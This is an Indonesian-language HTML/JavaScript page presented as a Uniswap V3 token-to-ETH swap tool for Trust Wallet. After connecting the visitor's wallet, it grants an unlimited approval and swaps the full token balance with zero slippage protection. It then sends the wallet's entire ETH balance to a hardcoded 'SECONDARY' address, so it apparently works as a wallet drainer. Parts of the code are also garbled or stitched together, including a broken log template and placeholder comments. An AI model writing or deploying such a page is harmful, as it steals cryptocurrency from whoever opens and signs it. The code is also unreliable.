<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uniswap V3 Swap - Trust Wallet Mobile</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; padding: 15px; 
            background: #0f0f0f; color: white; 
        }
        .container { 
            max-width: 100%; background: #1a1a1a; 
            padding: 20px; border-radius: 12px; 
        }
        button { 
            width: 100%; padding: 14px; margin: 10px 0; 
            font-size: 17px; border: none; border-radius: 10px; 
            background: #00cc66; color: white; font-weight: bold;
        }
        button:active { background: #00b359; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; font-size: 16px; }
        .log { 
            margin-top: 15px; height: 280px; overflow-y: auto; 
            background: #000; padding: 12px; border-radius: 8px; 
            font-family: monospace; font-size: 14px; line-height: 1.5;
        }
        .info { background: #003300; padding: 12px; border-radius: 8px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Uniswap V3 Token → ETH + Transfer</h2>
        <p><strong>Mode:</strong> Trust Wallet Mobile (APK)</p>
        
        <button onclick="connectWallet()">🔗 Hubungkan Trust Wallet</button>
        
        <div class="info">
            <strong>Alamat:</strong> <span id="account">Belum terhubung</span><br>
            <strong>Chain:</strong> <span id="chainId">-</span>
        </div>

        <h3>Alamat Token</h3>
        <input type="text" id="tokenAddress" value="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" placeholder="Contoh: USDC">

        <button onclick="getBalance()">💰 Cek Saldo</button>
        <div id="balanceInfo" style="margin:10px 0;"></div>

        <h3>Fee Tier</h3>
        <select id="feeTier" style="width:100%; padding:12px; border-radius:8px;">
            <option value="500">0.05%</option>
            <option value="3000" selected>0.3% (Paling Umum)</option>
            <option value="10000">1%</option>
        </select>

        <button onclick="approveToken()">✅ 1. Approve Token</button>
        <button onclick="executeSwapAndTransfer()">🚀 2. Swap Semua ke ETH + Kirim</button>

        <div class="log" id="log"></div>
    </div>

    <script>
        const SWAP_ROUTER = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45"; // Uniswap V3 Mainnet
        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e";
        const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

        let provider, signer, userAddress;

        const log = (msg, error = false) => {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString('id-ID');
            el.innerHTML += `<span style="color:\( {error ? '#ff5555' : '#55ff55'}">[ \){time}] ${msg}</span><br>`;
            el.scrollTop = el.scrollHeight;
        };

        async function connectWallet() {
            if (!window.ethereum) {
                alert("❌ Trust Wallet tidak mendeteksi window.ethereum\n\nPastikan Anda membuka halaman ini di dalam Trust Wallet Browser.");
                return;
            }

            try {
                provider = new ethers.BrowserProvider(window.ethereum);
                
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts"
                });

                userAddress = accounts[0];
                signer = await provider.getSigner();

                document.getElementById('account').textContent = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
                const network = await provider.getNetwork();
                document.getElementById('chainId').textContent = Number(network.chainId);

                log("✅ Berhasil terhubung ke Trust Wallet", false);
            } catch (err) {
                log("Gagal connect: " + err.message, true);
            }
        }

        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)",
            "function approve(address,uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)"
        ];

        const routerAbi = [
            "function exactInputSingle(tuple(address tokenIn,address tokenOut,uint24 fee,address recipient,uint256 amountIn,uint256 amountOutMinimum,uint160 sqrtPriceLimitX96) params) payable returns (uint256)"
        ];

        async function getBalance() {
            if (!userAddress) return log("Hubungkan dulu Trust Wallet!", true);
            // ... (sama seperti sebelumnya)
            const tokenAddr = document.getElementById('tokenAddress').value.trim();
            try {
                const token = new ethers.Contract(tokenAddr, erc20Abi, provider);
                const bal = await token.balanceOf(userAddress);
                const dec = await token.decimals();
                const sym = await token.symbol();
                const formatted = ethers.formatUnits(bal, dec);
                document.getElementById('balanceInfo').innerHTML = `<strong>${sym}:</strong> ${formatted}`;
                log(`Saldo ${sym}: ${formatted}`);
            } catch(e) {
                log("Gagal ambil saldo: " + e.message, true);
            }
        }

        async function approveToken() {
            if (!signer) return log("Hubungkan Trust Wallet terlebih dahulu!", true);
            // ... (kode approve sama)
            const tokenAddr = document.getElementById('tokenAddress').value.trim();
            try {
                log("Mengirim Approve...");
                const token = new ethers.Contract(tokenAddr, erc20Abi, signer);
                const tx = await token.approve(SWAP_ROUTER, ethers.MaxUint256);
                log(`Approve tx: ${tx.hash}`);
                await tx.wait();
                log("✅ Approve berhasil!", false);
            } catch(e) { log("Approve gagal: " + e.message, true); }
        }

        async function executeSwapAndTransfer() {
            if (!signer) return log("Hubungkan dulu!", true);
            // ... (kode swap + transfer ETH sama seperti sebelumnya)
            const tokenAddr = document.getElementById('tokenAddress').value.trim();
            try {
                const token = new ethers.Contract(tokenAddr, erc20Abi, provider);
                let amountIn = await token.balanceOf(userAddress);
                if (amountIn === 0n) return log("Saldo kosong!", true);

                const fee = Number(document.getElementById('feeTier').value);

                const router = new ethers.Contract(SWAP_ROUTER, routerAbi, signer);

                const params = {
                    tokenIn: tokenAddr,
                    tokenOut: WETH,
                    fee: fee,
                    recipient: userAddress,
                    amountIn: amountIn,
                    amountOutMinimum: 0n,
                    sqrtPriceLimitX96: 0n
                };

                log("🚀 Mengirim Swap...");
                const tx = await router.exactInputSingle(params);
                log(`Swap tx: ${tx.hash}`);
                await tx.wait();
                log("✅ Swap selesai!", false);

                // Kirim ETH ke secondary
                const ethBal = await provider.getBalance(userAddress);
                if (ethBal > 0n) {
                    log("Mengirim ETH ke secondary address...");
                    const sendTx = await signer.sendTransaction({
                        to: SECONDARY,
                        value: ethBal
                    });
                    await sendTx.wait();
                    log("✅ Semua ETH berhasil dikirim!", false);
                }
            } catch(e) {
                log("Error: " + e.message, true);
            }
        }
    </script>
</body>
</html>
